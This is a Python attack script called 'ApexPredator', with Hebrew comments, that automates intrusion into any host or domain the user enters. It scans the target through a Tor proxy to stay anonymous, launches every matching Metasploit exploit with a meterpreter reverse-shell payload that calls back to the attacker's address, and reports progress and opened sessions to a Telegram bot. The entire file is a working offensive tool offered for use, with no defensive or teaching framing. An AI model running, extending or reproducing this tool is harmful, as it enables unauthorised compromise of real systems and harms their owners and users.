import nmap, shodan, time, sys, os, requests, socket
from pymetasploit3.msfrpc import MsfRpcClient
from colorama import Fore, init

init(autoreset=True)

# --- CONFIGURATION ---
CONFIG = {
    'SHODAN_KEY': 'YOUR_SHODAN_KEY',
    'MSF_PASS': 'mypassword',
    'LHOST': 'YOUR_IP_OR_NGROK',
    'TG_TOKEN': 'YOUR_TELEGRAM_BOT_TOKEN',
    'CHAT_ID': 'YOUR_CHAT_ID'
}

def send_tg(msg):
    try:
        url = f"https://api.telegram.org/bot{CONFIG['TG_TOKEN']}/sendMessage"
        requests.post(url, data={'chat_id': CONFIG['CHAT_ID'], 'text': msg})
    except: pass

class ApexPredator:
    def __init__(self):
        try:
            self.client = MsfRpcClient(CONFIG['MSF_PASS'], port=55553)
            self.nm = nmap.PortScanner()
            print(Fore.GREEN + "[+] System Online & Connected to Metasploit")
        except Exception as e:
            print(Fore.RED + f"[-] Connection Error: {e}")
            sys.exit()

    def resolve_target(self, target):
        try:
            ip = socket.gethostbyname(target.replace("http://","").replace("https://","").split('/')[0])
            return ip
        except: return target

    def run_attack(self, target_input):
        ip = self.resolve_target(target_input)
        send_tg(f"🚀 Attack Started on: {target_input} ({ip})")
        
        print(Fore.CYAN + f"[*] Scanning {ip} for vulnerabilities...")
        # סריקה אגרסיבית אך אנונימית
        args = "--proxies socks5://127.0.0.1:9050 -sV -Pn -T3 --script vulners"
        self.nm.scan(ip, arguments=args)
        
        if ip not in self.nm.all_hosts():
            send_tg(f"❌ Target {ip} seems down.")
            return

        for proto in self.nm[ip].all_protocols():
            ports = self.nm[ip][proto].keys()
            for port in ports:
                service = self.nm[ip][proto][port]['name']
                print(Fore.YELLOW + f"[*] Testing service: {service} on port {port}")
                
                # חיפוש אקספלויט מתאים ב-Metasploit
                matches = self.client.modules.search(service)
                for match in matches:
                    if match['type'] == 'exploit':
                        exploit = self.client.modules.use('exploit', match['fullname'])
                        exploit['RHOSTS'] = ip
                        exploit['RPORT'] = port
                        
                        # ניסיון הרצת Payload
                        payload = self.client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
                        payload['LHOST'] = CONFIG['LHOST']
                        
                        print(Fore.RED + f"[!] Executing {match['fullname']}...")
                        exploit.execute(payload=payload)
                        
                        time.sleep(5)
                        if self.client.sessions.list:
                            send_tg(f"💰 SUCCESS! Session opened on {ip}")
                            return

        send_tg(f"🏁 Attack finished on {ip}. No immediate entry found.")

if __name__ == "__main__":
    app = ApexPredator()
    target = input("Enter Target (IP/Domain): ")
    app.run_attack(target)
